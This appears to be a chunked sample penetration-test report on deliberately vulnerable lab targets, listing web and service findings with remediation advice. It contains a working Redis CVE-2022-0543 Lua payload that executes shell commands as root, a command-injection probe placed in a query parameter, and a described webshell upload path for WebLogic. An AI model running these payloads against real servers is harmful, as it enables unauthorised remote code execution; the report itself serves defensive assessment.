User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64... Evidence Error message You have an error in your SQL syntax found in: >Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaD Request / Response Vulnerability description We noticed that the target application does not properly handle exceptional conditions, leading to error messages that reveal sensitive information. 38\\nRisk description The risk is that an attacker may use the contents of error messages to help launch another, more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. Recommendation It is recommended treating all exceptions of the application flow. Ensure that error messages only contain minimal details. Classification Category ID / Value CWE CWE-209 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A4 - Insecure Design Verification ✘ 39\\n4.1.12 Open Redirect Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest- ground.com:4280/vulnerabilities/open_redirect/source/low.p hp Method GET Vulnerable Parameter redirect (Query Parameter) Evidence The server redirects to the URL https://pentest- tools.com/file.txt when it is injected in the redirect query parameter. Request / Response Vulnerability description We noticed that the target application's backend server directly incorporates user input into URLs that it uses for redirection",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 8
    }
  },
  {
    "text": "hp Method GET Vulnerable Parameter redirect (Query Parameter) Evidence The server redirects to the URL https://pentest- tools.com/file.txt when it is injected in the redirect query parameter. Request / Response Vulnerability description We noticed that the target application's backend server directly incorporates user input into URLs that it uses for redirection without adequate validation. This behavior creates an open redirect vulnerability, which can lead users to arbitrary, potentially malicious domains. Risk description The risk is that attackers may use open redirect to redirect users to arbitrary domains of their choice. This can be used in phishing attacks, as targets will receive a trusted URL and might not notice the subsequent redirect. 40\\nRecommendation If possible, the application should not incorporate user input into URLs. Instead, use direct links to redirect towards the target page. If, however, this is not possible, you should only accept relative URLs as input. To check that the input represents a relative URL, make sure that it starts with a \"/\". If this check passes, prepend your domain name to it, and use this final result as the redirection URL. Classification Category ID / Value CWE CWE-601 OWASP Top 10 - 2021 A1 - Broken Access Control Verification ✔ This finding was validated so it is not a False Positive. 41\\n4.1.13 Enumerable Parameter Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest- ground.com:4280/vulnerabilities/open_redirect/source/info. php Method GET Vulnerable Parameter id (Query Parameter) Evidence The id query parameter appears to contain an enumerable numeric part. We modified its initial value 2 to 1 and the two responses were 96% similar. The parameter may introduce an Insecure Direct Object Reference (IDOR) vulnerability. Request / Response URL https://pentest- ground.com:4280/vulnerabilities/open_redirect/source/low.p hp Method GET Vulnerable Parameter redirect (Query Parameter) 42\\nEvidence The redirect query parameter appears to contain an enumerable numeric part. We modified its initial value info.php?id=2 to info.php?id=1 and the two responses were 96% similar. The parameter may introduce an Insecure Direct Object Reference (IDOR) vulnerability. Request / Response Vulnerability description We identified a parameter that uses numerical values to access resources, potentially leading to Insecure Direct Object References (IDOR) vulnerabilities. Risk description The vulnerability allows attackers to brute-force parameter values to uncover and access unauthorized resources and functionalities. Recommendation Ensure that parameter values would not reveal sensitive information and that the application properly checks the user's authorization to access the resource. Also, the resource IDs should not be predictable. References Testing for Insecure Direct Object References Classification Category ID / Value CWE CWE-284 OWASP Top 10 - 2017 A5 - Broken Access Control OWASP Top 10 - 2021 A1 - Broken Access Control Verification ✘ 43\\n4.1.14 Internal Server Error Found Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest- ground.com:4280/vulnerabilities/open_redirect/source/low.p hp Method GET Parameters Query: redirect=info.php?id=2;echo ttp1739356088.1073|rev|sed - e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A-Z #';echo ttp1739356088.1073|rev|sed -e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A- Z #\";echo ttp1739356088.1073|rev|sed -e 's/^/ptt/' -e &... Evidence Response has an internal server error status code: 500 Request / Response Vulnerability description We noticed that the target application's website does not properly",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 9
    }
  },
  {
    "text": "Query: redirect=info.php?id=2;echo ttp1739356088.1073|rev|sed - e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A-Z #';echo ttp1739356088.1073|rev|sed -e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A- Z #\";echo ttp1739356088.1073|rev|sed -e 's/^/ptt/' -e &... Evidence Response has an internal server error status code: 500 Request / Response Vulnerability description We noticed that the target application's website does not properly handle or incorrectly manages exceptional conditions like Internal Server Errors. These errors can reveal sensitive information through their error messages. For instance, an error message could inadvertently disclose system paths or private application details. Risk description The risk exists that attackers could utilize information revealed in Internal Server Error messages to mount more targeted and effective attacks. Detailed error messages 44\\ncould, for example, expose a path traversal weakness (CWE-22) or other exploitable system vulnerabilities. Recommendation Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not. Classification Category ID / Value CWE CWE-209 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration 45\\nScreenshots Figure 1. Internal Error Verification ✔ This finding was validated so it is not a False Positive. 46\\n4.1.15 Missing security header: Strict-Transport-Security Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Evidence https://pentest-ground.com:4280/ Response headers do not include the HTTP Strict-Transport-Security header Request / Response Vulnerability description We noticed that the target application lacks the HTTP Strict-Transport-Security header in its responses. This security header is crucial as it instructs browsers to only establish secure (HTTPS) connections with the web server and reject any HTTP connections. Risk description The risk is that lack of this header permits an attacker to force a victim user to initiate a clear-text HTTP connection to the server, thus opening the possibility to eavesdrop on the network traffic and extract sensitive information (e.g. session cookies). Recommendation The Strict-Transport-Security HTTP header should be sent with each HTTPS response. The syntax is as follows: Strict-Transport-Security: max-age=<seconds>[; includeSubDomains] The parameter max-age gives the time frame for requirement of HTTPS in seconds and should be chosen quite high, e.g. several months. A value below 7776000 is considered as too low by this scanner check. 47\\nThe flag includeSubDomains defines that the policy applies also for sub domains of the sender of the response. Classification Category ID / Value CWE CWE-693 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 -",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 10
    }
  },
  {
    "text": "is considered as too low by this scanner check. 47\\nThe flag includeSubDomains defines that the policy applies also for sub domains of the sender of the response. Classification Category ID / Value CWE CWE-693 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 48\\n4.1.16 Missing security header: X-Content-Type-Options Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Evidence https://pentest-ground.com:4280/ Response headers do not include the X-Content-Type-Options HTTP security header Request / Response Vulnerability description We noticed that the target application's server responses lack the X-Content-Type- Options header. This header is particularly important for preventing Internet Explorer from reinterpreting the content of a web page (MIME-sniffing) and thus overriding the value of the Content-Type header. Risk description The risk is that lack of this header could make possible attacks such as Cross-Site Scripting or phishing in Internet Explorer browsers. Recommendation We recommend setting the X-Content-Type-Options header such as X-Content- Type-Options: nosniff. References https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options 49\\nClassification Category ID / Value CWE CWE-693 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 50\\n4.1.17 Missing security header: Content-Security-Policy Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Evidence https://pentest-ground.com:4280/ Response does not include the HTTP Content-Security-Policy security header or meta tag Request / Response Vulnerability description We noticed that the target application lacks the Content-Security-Policy (CSP) header in its HTTP responses. The CSP header is a security measure that instructs web browsers to enforce specific security rules, effectively preventing the exploitation of Cross-Site Scripting (XSS) vulnerabilities. Risk description The risk is that if the target application is vulnerable to XSS, lack of this header makes it easily exploitable by attackers. Recommendation Configure the Content-Security-Header to be sent with each HTTP response in order to apply the specific policies needed by the application. References https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet. html https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy 51\\nClassification Category ID / Value CWE CWE-693 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 52\\n4.1.18 Missing security header: Referrer-Policy Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Evidence https://pentest-ground.com:4280/ Response headers do not include the Referrer-Policy HTTP security header as well as the <meta> tag with name 'referrer' is not present in the response. Request / Response Vulnerability description We noticed that the target application's server responses lack the Referrer-Policy HTTP header, which controls how much referrer information the browser will send with each request originated from the current web application. Risk description The risk is that if a user visits a web page (e.g. \"http://example.com/pricing/\") and clicks on a link from that page going to e.g. \"https://www.google.com\", the browser will send to Google the full originating URL in the Referer header, assuming the Referrer-Policy header is not set. The originating URL could be considered sensitive",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 11
    }
  },
  {
    "text": "that if a user visits a web page (e.g. \"http://example.com/pricing/\") and clicks on a link from that page going to e.g. \"https://www.google.com\", the browser will send to Google the full originating URL in the Referer header, assuming the Referrer-Policy header is not set. The originating URL could be considered sensitive information and it could be used for user tracking. Recommendation The Referrer-Policy header should be configured on the server side to avoid user tracking and inadvertent information leakage. The value no-referrer of this header instructs the browser to omit the Referer header entirely. 53\\nReferences https://developer.mozilla.org/en- US/docs/Web/Security/Referer_header:_privacy_and_security_concerns Classification Category ID / Value CWE CWE-693 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 54\\n4.1.19 Unsafe security header: Content-Security-Policy Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Evidence https://pentest- Response headers include the HTTP ground.com:4280/vulnerabilities/csp/ Content-Security-Policy security header with the following security issues: Request / Response Vulnerability description We noticed that the Content-Security-Policy (CSP) header configured for the web application includes unsafe directives. The CSP header activates a protection mechanism implemented in web browsers which prevents exploitation of Cross-Site Scripting vulnerabilities (XSS) by restricting the sources from which content can be loaded or executed. Risk description For example, if the unsafe-inline directive is present in the CSP header, the execution of inline scripts and event handlers is allowed. This can be exploited by an attacker to execute arbitrary JavaScript code in the context of the vulnerable application. Recommendation Remove the unsafe values from the directives, adopt nonces or hashes for safer inclusion of inline scripts if they are needed, and explicitly define the sources from which scripts, styles, images or other resources can be loaded. 55\\nReferences https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet. html https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy Classification Category ID / Value CWE CWE-693 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 56\\n4.1.20 Password Submitted in URL Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/brute/ Method GET Parameters Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Cookies: PHPSESSID=589f7516a2374b37367b6b2f248c71f5 security=low Evidence The following form sends inputs of type password plainly in the URL: Request / Response URL https://pentest-ground.com:4280/vulnerabilities/brute/ Method GET Parameters Query: Login=Login password=Secure123456$ 57\\nusername=1d3d2d231d2dd4 Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Cookies: PHPSESSID=589f7516a2374b37367b6b2f248c71f5 security=low Evidence The following form sends inputs of type password plainly in the URL: Request / Response URL https://pentest-ground.com:4280/vulnerabilities/brute/ Method GET Parameters Query: Login=Login password[$ptt]=Secure123456$ username[$ptt]=1d3d2d231d2dd4 Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Cookies: PHPSESSID=589f7516a2374b37367b6b2f248c71f5 security=low Evidence The following form sends inputs of type password plainly in the URL: Request / Response URL https://pentest-ground.com:4280/vulnerabilities/csrf/ 58\\nMethod GET Parameters Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Cookies: PHPSESSID=589f7516a2374b37367b6b2f248c71f5 security=low Evidence The following form sends inputs of type password plainly in the URL:",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 12
    }
  },
  {
    "text": "Evidence The following form sends inputs of type password plainly in the URL: Request / Response URL https://pentest-ground.com:4280/vulnerabilities/csrf/ 58\\nMethod GET Parameters Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Cookies: PHPSESSID=589f7516a2374b37367b6b2f248c71f5 security=low Evidence The following form sends inputs of type password plainly in the URL: Request / Response URL https://pentest-ground.com:4280/vulnerabilities/csrf/ Method GET Parameters Query: Change=Change password_conf=Secure123456$ password_new=Secure123456$ Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Cookies: PHPSESSID=589f7516a2374b37367b6b2f248c71f5 security=low Evidence The following form sends inputs of type password plainly in the URL: Request / Response 59\\nVulnerability description We found a form which is submitted using a GET method and has inputs of the type password. The end result is that passwords are submitted in URLs. Risk description Passwords submitted in URLs have a higher chance of being leaked. The main reason is that URLs can be leaked in browser cross-site requests via the Referer header. Additionally, URLs are usually stored in all kinds of logs. If any access or error logs of the server were publicly accessible, an attacker could also harvest password from it. Recommendation You should submit passwords using POST rather than GET. This way sensitive data won't be shared to other locations via URLs. References https://developer.mozilla.org/en- US/docs/Web/Security/Referer_header:_privacy_and_security_concerns Classification Category ID / Value OWASP Top 10 - 2021 A4 - Insecure Design Verification ✔ This finding was validated so it is not a False Positive. 60\\n4.1.21 Server software and technology found Affected target https://pentest-ground.com:4280/ Status: Open Evidence Software / Version Category Nginx 1.27.4 Web servers, Reverse proxies PHP 8.4.3 Programming languages Vulnerability description We noticed that server software and technology details are exposed, potentially aiding attackers in tailoring specific exploits against identified systems and versions. Risk description The risk is that an attacker could use this information to mount specific attacks against the identified software type and version. Recommendation We recommend you to eliminate the information which permits the identification of software platform, technology, server and operating system: HTTP server headers, HTML meta information, etc. References https://owasp.org/www-project-web-security-testing-guide/stable/4- Web_Application_Security_Testing/01-Information_Gathering/02- Fingerprint_Web_Server.html 61\\nClassification Category ID / Value OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Screenshots Figure 1. Website Screenshot Verification ✘ 62\\n4.1.22 Robots.txt file found Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/robots.txt Vulnerability description We found the robots.txt on the target server. This file instructs web crawlers what URLs and endpoints of the web application they can visit and crawl. Website administrators often misuse this file while attempting to hide some web pages from the users. Risk description There is no particular security risk in having a robots.txt file. However, it's important to note that adding endpoints in it should not be considered a security measure, as this file can be directly accessed and read by anyone. Recommendation We recommend you to manually review the entries from robots.txt and remove the ones which lead to sensitive locations in the website (ex. administration panels, configuration files, etc). References https://www.theregister.co.uk/2015/05/19/robotstxt/ Classification Category",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 13
    }
  },
  {
    "text": "not be considered a security measure, as this file can be directly accessed and read by anyone. Recommendation We recommend you to manually review the entries from robots.txt and remove the ones which lead to sensitive locations in the website (ex. administration panels, configuration files, etc). References https://www.theregister.co.uk/2015/05/19/robotstxt/ Classification Category ID / Value 63\\nOWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Screenshots Figure 1. robots.txt Verification ✔ This finding was validated so it is not a False Positive. 64\\n4.1.23 Exposure of Sensitive Information Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/phpinfo.php Method GET Parameters Headers: User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Evidence Email Address: license@php.net Request / Response Vulnerability description We noticed that this application does not properly prevent a person's private, personal information from being accessed by actors who either (1) are not explicitly authorized to access the information or (2) do not have the implicit consent of the person about whom the information is collected. Sensitive data targeted usually consists of emails, credit card and social security numbers. Risk description The risk exists that sensitive personal information within the application could be accessed by unauthorized parties. This could lead to privacy violations, identity theft, or other forms of personal or corporate harm. 65\\nRecommendation Compartmentalize the application to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Verification ✘ 66\\n4.1.24 Interesting files found Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/login.php Page Title Login :: Damn Vulnerable Web A Page Size 1.36 KB Summary Admin login page/section found. URL https://pentest-ground.com:4280/php.ini Page Title Page Size 154 B Summary The php.ini may contain important php settings. URL https://pentest-ground.com:4280/README.md Page Title 67\\nPage Size 24.91 KB Summary Internal documentation file often used in projects which can contain sensitive information. URL https://pentest-ground.com:4280/setup.php Page Title Setup :: Damn Vulnerable Web A Page Size 5.03 KB Summary The setup.php may contain sensitive informations such as users and credentials. URL https://pentest-ground.com:4280/phpinfo.php Page Title PHP 8.4.3 - phpinfo() Page Size 79.18 KB Summary phpinfo() exposes information about the configuration of the PHP environment and server. Vulnerability description We have discovered that the target application exposes 'interesting' files or folders, which are typically hidden or not intended for public access. This vulnerability is often a result of improper file and directory permissions or server misconfigurations. Risk description The risk is that these files/folders usually contain sensitive information which may help attackers to mount further attacks against the server. Manual validation is required. 68\\nRecommendation We recommend you to analyze if the mentioned files/folders contain any sensitive information and restrict their access according to the business purposes of the application. Classification Category ID / Value CWE CWE-200 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✘ 69\\n4.2",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 14
    }
  },
  {
    "text": "to analyze if the mentioned files/folders contain any sensitive information and restrict their access according to the business purposes of the application. Classification Category ID / Value CWE CWE-200 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✘ 69\\n4.2 Target: pentest-ground.com 4.2.1 Redis - Remote Code Execution (CVE-2022-0543) Affected target pentest-ground.com Status: Open Port: 6379 Evidence We managed to detect this vulnerability by evaluating the payload that contains the id command: eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 Data received: uid=0(root) gid=0(root) groups=0(root) Vulnerability description We found that the target server is vulnerable to CVE-2022-0543, a Remote Code Execution vulnerability in the Redis caching service. The root cause of this vulnerability consists in an unexpected sandbox escape on Debian systems because of the dynamically load of the Lua interpreter. Therefore, an unauthenticated remote attacker can connect to the Redis service, evaluate a library load and execute shell commands. We have detected this vulnerability by connecting to the Redis service, loading liblua5.1.so.0 library, executing id command and reading the command response from the output. Risk description The risk exists that a remote unauthenticated attacker can fully compromise the server in order to steal confidential information, install ransomware or pivot to the internal network. 70\\nRecommendation We recommend upgrading the Redis service to a version equal to or higher than 5:5.0.14-1+deb10u2 for the oldstable version, or 5:5.0.14-1+deb10u2 for the stable distribution. References https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0543 https://nvd.nist.gov/vuln/detail/CVE-2022-0543 Classification Category ID / Value CVSS 10 CVE CVE-2022-0543 Verification ✔ This finding was validated so it is not a False Positive. 71\\n4.2.2 Oracle Weblogic - Remote Code Execution (CVE-2018- 2894) Affected target pentest-ground.com Status: Open Port: 7001 Evidence We managed to detect this vulnerability using the following request, by extracting the current user using the whoami/id command: HTTP Request: GET /ws_utc/css/config/keystore/1738221567457_cfymiqrstcohwfr.jsp HTTP/1.1 Host: pentest-ground.com HTTP Response: HTTP 200 oracle Vulnerability description We found that the target server is vulnerable to CVE-2018-2894, a Remote Code Execution vulnerability, affecting the Oracle Weblogic server. This vulnerability is affecting the WLS subcomponent because the path of /ws_utc/config.do is reachable without authentication, meaning that the Weblogic server is in the development mode. The attacker can set a new Work Home Directory which needs to be writable and then upload JKS Keystores, which are Java Server Pages (JSP) files. Uploading a webshell as a JKS, the attacker can successfully achieve Remote Code Execution on the server. We have detected this vulnerability by changing the Work Home Directory to a writable one sending an HTTP POST request, then uploading the webshell as a command interpreter with an HTTP POST request, and finally sending an HTTP GET request to the webshell to read the command response from the output. 72\\nRisk description The risk exists that a remote unauthenticated attacker can fully compromise the server in order to steal confidential information, install ransomware, or pivot to the internal network. Recommendation",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 15
    }
  },
  {
    "text": "POST request, and finally sending an HTTP GET request to the webshell to read the command response from the output. 72\\nRisk description The risk exists that a remote unauthenticated attacker can fully compromise the server in order to steal confidential information, install ransomware, or pivot to the internal network. Recommendation We recommend upgrading the Oracle Weblogic to the latest version. References https://nvd.nist.gov/vuln/detail/cve-2018-2894 https://www.oracle.com/security-alerts/cpujul2018.html Classification Category ID / Value CVSS 7.5 CVE CVE-2018-2894 Verification ✔ This finding was validated so it is not a False Positive. 73\\n4.2.3 Oracle WebLogic Server - Remote Code Execution (CVE-2020-2551) port 7001/tcp Affected target pentest-ground.com Status: Open Port: 7001 Evidence We managed to detect this vulnerability using the following Request / Response chain. Endpoint: https://pentest-ground.com:7001/console/login/LoginForm.jsp How to reproduce curl -X 'GET' \\ -H 'Accept: */*' \\ -H 'Accept-Language: en' \\ -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36' 'https://pentest- ground.com:7001/console/login/LoginForm.jsp' Vulnerability description Oracle WebLogic Server (Oracle Fusion Middleware (component: WLS Core Components) is susceptible to a remote code execution vulnerability. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 2.2.1.3.0 and 12.2.1.4.0. This easily exploitable vulnerability could allow unauthenticated attackers with network access via IIOP to compromise Oracle WebLogic Server. Risk description The risk exists that a remote unauthenticated attacker can fully compromise the server to steal confidential information, install ransomware, or pivot to the internal network. 74\\nRecommendation Apply the latest security patches provided by Oracle to mitigate this vulnerability. References https://github.com/hktalent/CVE-2020-2551 https://nvd.nist.gov/vuln/detail/CVE-2020-2551 https://www.oracle.com/security-alerts/cpujan2020.html https://github.com/neilzhang1/Chinese-Charts https://github.com/pjgmonteiro/Pentest-tools Classification Category ID / Value CVE CVE-2020-2551 Verification ✔ This finding was validated so it is not a False Positive. 75\\n4.2.4 Vulnerabilities found for Redis Key-Value Store 5.0.7 Affected target pentest-ground.com Status: Open Port: 6379 Evidence Risk level High CVSS 9 CVE CVE-2021-32762 Summary Redis is an open source, in-memory database that persists on disk. The redis-cli command line tool and redis-sentinel service may be vulnerable to integer overflow when parsing specially crafted large multi- bulk network replies. This is a result of a vulnerability in the underlying hiredis library which does not perform an overflow check before calling the calloc() heap allocation function. This issue only impacts systems with heap allocators that do not perform their own overflow checks. Most modern systems do and are therefore not likely to be affected. Furthermore, by default redis-sentinel uses the jemalloc allocator which is also not vulnerable. The problem is fixed in Redis versions 6.2.6, 6.0.16 and 5.0.14. Exploit N/A Risk level High 76\\nCVSS 8.8 CVE CVE-2022-24834 Summary Redis is an in-memory database that persists on disk. A specially crafted Lua script executing in Redis can trigger a heap overflow in the cjson library, and result with heap corruption and potentially remote code execution. The problem exists in all versions of Redis with Lua scripting support, starting from 2.6, and affects only authenticated and authorized users. The problem is fixed in versions 7.0.12, 6.2.13, and 6.0.20. Exploit N/A Risk level Medium CVSS 6.8 CVE CVE-2022-24735 Summary Redis is an in-memory database that persists on disk. By exploiting weaknesses in",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 16
    }
  },
  {
    "text": "versions of Redis with Lua scripting support, starting from 2.6, and affects only authenticated and authorized users. The problem is fixed in versions 7.0.12, 6.2.13, and 6.0.20. Exploit N/A Risk level Medium CVSS 6.8 CVE CVE-2022-24735 Summary Redis is an in-memory database that persists on disk. By exploiting weaknesses in the Lua script execution environment, an attacker with access to Redis prior to version 7.0.0 or 6.2.7 can inject Lua code that will execute with the (potentially higher) privileges of another Redis user. The Lua script execution environment in Redis provides some measures that prevent a script from creating side effects that persist and can affect the execution of the same, or different script, at a later time. Several weaknesses of these measures have been publicly known for a long time, but they had no security impact as the Redis security model did not endorse the concept of users or privileges. With the introduction of ACLs in Redis 6.0, these weaknesses can be exploited by a less 77\\nprivileged users to inject Lua code that will execute at a later time, when a privileged user executes a Lua script. The problem is fixed in Redis versions 7.0.0 and 6.2.7. An additional workaround to mitigate this problem without patching the redis-server executable, if Lua scripting is not being used, is to block access to `SCRIPT LOAD` and `EVAL` commands using ACL rules. Exploit N/A Risk level Medium CVSS 6.5 CVE CVE-2021-32626 Summary Redis is an open source, in-memory database that persists on disk. In affected versions specially crafted Lua scripts executing in Redis can cause the heap- based Lua stack to be overflowed, due to incomplete checks for this condition. This can result with heap corruption and potentially remote code execution. This problem exists in all versions of Redis with Lua scripting support, starting from 2.6. The problem is fixed in versions 6.2.6, 6.0.16 and 5.0.14. For users unable to update an additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from executing Lua scripts. This can be done using ACL to restrict EVAL and EVALSHA commands. Exploit N/A Risk level Medium 78\\nCVSS 6.5 CVE CVE-2023-25155 Summary Redis is an in-memory database that persists on disk. Authenticated users issuing specially crafted `SRANDMEMBER`, `ZRANDMEMBER`, and `HRANDFIELD` commands can trigger an integer overflow, resulting in a runtime assertion and termination of the Redis server process. This problem affects all Redis versions. Patches were released in Redis version(s) 6.0.18, 6.2.11 and 7.0.9. Exploit N/A Risk level Medium CVSS 6.5 CVE CVE-2023-28856 Summary Redis is an open source, in-memory database that persists on disk. Authenticated users can use the `HINCRBYFLOAT` command to create an invalid hash field that will crash Redis on access in affected versions. This issue has been addressed in in versions 7.0.11, 6.2.12, and 6.0.19. Users are advised to upgrade. There are no known workarounds for this issue. Exploit N/A Risk level Medium 79\\nCVSS 6.5 CVE CVE-2021-21309 Summary Redis is an open-source, in-memory database that persists on",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 17
    }
  },
  {
    "text": "Redis on access in affected versions. This issue has been addressed in in versions 7.0.11, 6.2.12, and 6.0.19. Users are advised to upgrade. There are no known workarounds for this issue. Exploit N/A Risk level Medium 79\\nCVSS 6.5 CVE CVE-2021-21309 Summary Redis is an open-source, in-memory database that persists on disk. In affected versions of Redis an integer overflow bug in 32-bit Redis version 4.0 or newer could be exploited to corrupt the heap and potentially result with remote code execution. Redis 4.0 or newer uses a configurable limit for the maximum supported bulk input size. By default, it is 512MB which is a safe value for all platforms. If the limit is significantly increased, receiving a large request from a client may trigger several integer overflow scenarios, which would result with buffer overflow and heap corruption. We believe this could in certain conditions be exploited for remote code execution. By default, authenticated Redis users have access to all configuration parameters and can therefore use the “CONFIG SET proto-max-bulk-len” to change the safe default, making the system vulnerable. **This problem only affects 32-bit Redis (on a 32-bit system, or as a 32-bit executable running on a 64-bit system).** The problem is fixed in version 6.2, and the fix is back ported to 6.0.11 and 5.0.11. Make sure you use one of these versions if you are running 32-bit Redis. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent clients from directly executing `CONFIG SET`: Using Redis 6.0 or newer, ACL configuration can be used to block the command. Using older versions, the `rename-command` configuration directive can be used to rename the command to a random string unknown to users, rendering it inaccessible. Please note that this workaround may have an additional impact on users or operational systems that expect `CONFIG SET` to behave in certain ways. Exploit N/A 80\\nRisk level Medium CVSS 6 CVE CVE-2021-32627 Summary Redis is an open source, in-memory database that persists on disk. In affected versions an integer overflow bug in Redis can be exploited to corrupt the heap and potentially result with remote code execution. The vulnerability involves changing the default proto-max-bulk-len and client-query-buffer- limit configuration parameters to very large values and constructing specially crafted very large stream elements. The problem is fixed in Redis 6.2.6, 6.0.16 and 5.0.14. For users unable to upgrade an additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from modifying the proto-max-bulk-len configuration parameter. This can be done using ACL to restrict unprivileged users from using the CONFIG SET command. Exploit N/A Risk level Medium CVSS 6 CVE CVE-2021-32628 Summary Redis is an open source, in-memory database that persists on disk. An integer overflow bug in the ziplist data structure used by all versions of Redis can be exploited to corrupt the heap and potentially result with remote code execution. The vulnerability involves 81\\nmodifying the default ziplist configuration parameters (hash-max-ziplist-entries, hash-max-ziplist-value, zset-max-ziplist-entries or zset-max-ziplist-value) to a very",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 18
    }
  },
  {
